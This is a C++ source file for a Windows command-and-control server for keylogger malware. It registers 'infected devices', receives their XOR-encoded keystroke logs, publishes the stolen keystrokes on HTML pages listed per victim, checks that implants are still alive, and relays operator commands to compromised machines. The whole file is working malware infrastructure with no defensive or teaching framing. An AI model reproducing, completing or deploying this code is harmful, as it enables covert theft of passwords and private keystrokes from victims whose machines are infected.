#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>
#include <unordered_map>
#include <string>
#include <sstream>
#include <thread>
#include <mutex>
#include <condition_variable>
#include <vector>

#pragma comment(lib, "Ws2_32.lib")

using namespace std;

const int PORT = 8888;
unordered_map<string, SOCKET> infectedDevices;
unordered_map<string, string> keysLogged;
mutex mtx;

// Encode the message with XOR
string encode(const string& message) {
    char key = '1';
    string encodedMessage = message;
    for (char& c : encodedMessage) {
        c = c ^ key;
        key = (key << 1) | (key >> 7);
    }
    return encodedMessage;
}

//decode incomming messages
string decode(const string& encodedMessage) {
    char key = '1';
    string decodedMessage = encodedMessage;
    for (char& c : decodedMessage) {
        c = c ^ key;
        key = (key << 1) | (key >> 7);
    }
    return decodedMessage;
}

//make sure malware is still active 
void sendBeacons(){
    // applys function to all threads
    lock_guard<mutex> lock(mtx);

    //iterate through malware sockets
    auto it = infectedDevices.begin();
    while (it != infectedDevices.end()) {
        SOCKET clientSocket = it->second;
        if (clientSocket != INVALID_SOCKET) {
            int sendResult = send(clientSocket, "", 0, 0);

            // malware not active
            if (sendResult == SOCKET_ERROR) {
                closesocket(clientSocket);
                it = infectedDevices.erase(it);
            } else {
                it++;
            }
        } else { // close socket if invalid
            closesocket(clientSocket);
            it = infectedDevices.erase(it);
        }
    }
}

//send command to malware
void sendCommand(const string& cmd) {
    // intialise variables
    stringstream commandStream(cmd);
    vector<string> commandSegments;
    string segment;

// make sure command has right ammout of segments
    while (getline(commandStream, segment, ' ')) {
        commandSegments.push_back(segment);
    }
    if (commandSegments.size() < 2 || commandSegments.size() > 3) {
        cerr << "Invalid command format." << endl;
        return;
    }

    // get the specific socket command should be sent to
    string id = commandSegments[1];
    if (id.find("Device-") == string::npos){
        id = "Device-" + id;
    }
    auto it = infectedDevices.find(id);
    if (it == infectedDevices.end()) {
        cerr << "Device not found: " << id << endl;
        return;
    } SOCKET clientSocket = it->second;

    // check socket is still valid and send command
    if (clientSocket != INVALID_SOCKET) {
        int sendResult = send(clientSocket, encode(cmd).c_str(), static_cast<int>(cmd.size()), 0);
        if (sendResult == SOCKET_ERROR) {
            cerr << "Failed to send command to client. Error code: " << WSAGetLastError() << endl;
        } else {
            cout << "Sent command to " << id << ": " << cmd << endl;
        }
    } else {
        cerr << "Socket is invalid for device: " << id << endl;
    }
}

void checkforLogUpdates() {
    // applys function to all threads
    lock_guard<mutex> lock(mtx);

    //itterate through live socket
    for (const auto& pair : infectedDevices) {
        //set socket and id
        const string& deviceId = pair.first;
        SOCKET currentSocket = infectedDevices[deviceId];

        //set variables
        fd_set readFileSet;
        FD_ZERO(&readFileSet);
        FD_SET(currentSocket, &readFileSet);

        //set timeout time  to avoid extreamly long waits
        timeval timeout;
        timeout.tv_sec = 0;
        timeout.tv_usec = 0;
        int selectResult = select(0, &readFileSet, nullptr, nullptr, &timeout);

        if (selectResult == SOCKET_ERROR) {
            cerr << "Select failed.\n";
        } else if (selectResult > 0) {
            //recieve log update
            char buffer[4096];
            int bytesReceived = recv(currentSocket, buffer, sizeof(buffer), 0);
            if (bytesReceived == SOCKET_ERROR || bytesReceived == 0) {
                //cerr << "Receive failed or connection closed.\n";
            } else {
                // decode and add log to map
                buffer[bytesReceived] = '\0';
                string encodedMessage = buffer;
                string newLog = decode(encodedMessage);
                keysLogged[deviceId] += newLog;
            }
        }
    }
}

// handle request to connect to server
void handleRequests(SOCKET malwareSocket, const string& request) {
    // applys function to all threads
    lock_guard<mutex> lock(mtx);

    string commandInput;
    //load https for a devices key log
    if (request.find("GET /clients/Device") != string::npos) {
        cout << "Handling device log request..." << endl;
        // Extract DeviceID from request
        string deviceId;
        size_t idPos = request.find("-");
        if (idPos != string::npos) {
            size_t idEndPos = request.find(" ", idPos);
            if (idEndPos == string::npos) {
                idEndPos = request.size();
            }
            deviceId = "Device-" + request.substr(idPos + 1, idEndPos - (idPos + 1));
        } else {
            return;
        }

        //generate the html code to display log
        stringstream htmlResponse;
        htmlResponse << "<html>"
                     << "<head><title>" << deviceId << "</title></head>"
                     << "<body>"
                     << "<h1>" << deviceId << "</h1>"
                     << keysLogged[deviceId]
                     << "</body>"
                     << "</html>";
        
        //send log to html to client
        string response = "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: " + to_string(htmlResponse.str().size()) + "\r\n\r\n" + htmlResponse.str();
        send(malwareSocket, response.c_str(), static_cast<int>(response.size()), 0);
        closesocket(malwareSocket);

        // load list of infected devices
    } else if (request.find("GET /clients") != string::npos) {
        cout << "Handling infected devices list request..." << endl;

        // Generate HTML for listing infected devices
        stringstream htmlResponse;
        htmlResponse << "<html>"
                     << "<head><title>Infected Devices</title></head>"
                     << "<body>"
                     << "<h1>Infected Devices</h1>";

        // Loop through infected devices and create html code to display hav have link to their logs
        for (const auto& pair : infectedDevices) {
            const string& deviceId = pair.first;
            htmlResponse << "<p><a href=\"/clients/" << deviceId << "\">" << deviceId << "</a></p>";
        }

        htmlResponse << "</body>"
                     << "</html>";

        //send page to html to client
        string response = "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: " + to_string(htmlResponse.str().size()) + "\r\n\r\n" + htmlResponse.str();
        send(malwareSocket, response.c_str(), static_cast<int>(response.size()), 0);
        closesocket(malwareSocket);

        // register a newly infected device
    } else if (request.find("GET /newClient") != string::npos) {
        cout << "Handling new client registration..." << endl;

        // Extract DeviceID from request
        string deviceId;
        size_t idPos = request.find("id=");
        if (idPos != string::npos) {
            size_t idEndPos = request.find(" ", idPos);
            if (idEndPos == string::npos) {
                idEndPos = request.size();
            }
            deviceId = request.substr(idPos + 3, idEndPos - (idPos + 3));
        } else {
            cerr << "Invalid client registration format." << endl;
            return;
        }

        // Add the device to infectedDevices map with deviceId as key and malwareSocket as value
        infectedDevices[deviceId] = malwareSocket;
        cout<<deviceId<<endl;
        string response = "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nconnected";
        //send(malwareSocket, response.c_str(), static_cast<int>(response.size()), 0);
    
    // handel invalid access requests
    } else {
        cerr << "Unsupported request" << endl;
        string response = "HTTP/1.1 400 Bad Request\r\nContent-Type: text/html\r\n\r\n<h1>Bad Request: Unsupported Endpoint</h1>";
        //send(malwareSocket, response.c_str(), static_cast<int>(response.size()), 0);
        closesocket(malwareSocket);
    }
}

//thread to manage server socket and conntion request
void socketThread() {
    //create C&C socket variables
    WSADATA wsaData;
    SOCKET CandCSocket = INVALID_SOCKET;
    struct sockaddr_in CandCAddress, deviceAddress;
    int deviceAddressLength = sizeof(deviceAddress);
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        cerr << "WSAStartup failed.\n";
        return;
    }

    //create C&C socket
    CandCSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (CandCSocket == INVALID_SOCKET) {
        cerr << "Socket creation failed.\n";
        WSACleanup();
        return;
    }

    //bind C&C socket
    CandCAddress.sin_family = AF_INET;
    CandCAddress.sin_addr.s_addr = INADDR_ANY;
    CandCAddress.sin_port = htons(PORT);
    if (bind(CandCSocket, (struct sockaddr*)&CandCAddress, sizeof(CandCAddress)) == SOCKET_ERROR) {
        cerr << "Bind failed.\n";
        closesocket(CandCSocket);
        WSACleanup();
        return;
    }

    //listen for connection request
    if (listen(CandCSocket, SOMAXCONN) == SOCKET_ERROR) {
        cerr << "Listen failed.\n";
        closesocket(CandCSocket);
        WSACleanup();
        return;
    }

    cout<<"Server started. Listening on port "<<PORT<< "..."<<endl;

    //constantly read incoming connection request
    while (true) {
        SOCKET malwareSocket = accept(CandCSocket, (struct sockaddr*)&deviceAddress, &deviceAddressLength);
        if (malwareSocket == INVALID_SOCKET) {
            cerr << "Accept failed.\n";
            closesocket(CandCSocket);
            WSACleanup();
            return;
        }

        //read message sent with connection request
        char buffer[4096] = {0};
        int recvResult = recv(malwareSocket, buffer, sizeof(buffer), 0);
        if (recvResult == SOCKET_ERROR || recvResult == 0) {
            cerr << "Receive failed or connection closed.\n";
            closesocket(malwareSocket);
            continue;
        }

        // Handle the received request
        handleRequests(malwareSocket, buffer);

    }

    closesocket(CandCSocket);
    WSACleanup();
}

//thread to allow user to type commands in the terminal while awaiting on output to terminal 
void consoleInputThread() {
    while (true) {
        //get command from terminal input
        string commandInput;
        getline(cin, commandInput);

        // Process the command
        if (commandInput == "exit") {
            cout << "Exiting server..." << endl;
            break;
        } else {
            sendCommand(commandInput);
        }
    }
}

//thread to check for log updates and beacons
void checksThreads(){
    //send beacon out at regular intervals
    int beaconCount = 0;
    while(true){
        checkforLogUpdates();

        if(beaconCount>=100000){
            sendBeacons();
            beaconCount = 0;
        }
        beaconCount++;
    }
}

int main() {
    thread socketThr(socketThread);
    thread consoleThr(consoleInputThread);
    thread checkThr(checksThreads);

    // Join the threads to wait for them to finish
    socketThr.join();
    consoleThr.join();
    checkThr.join();

    return 0;
}
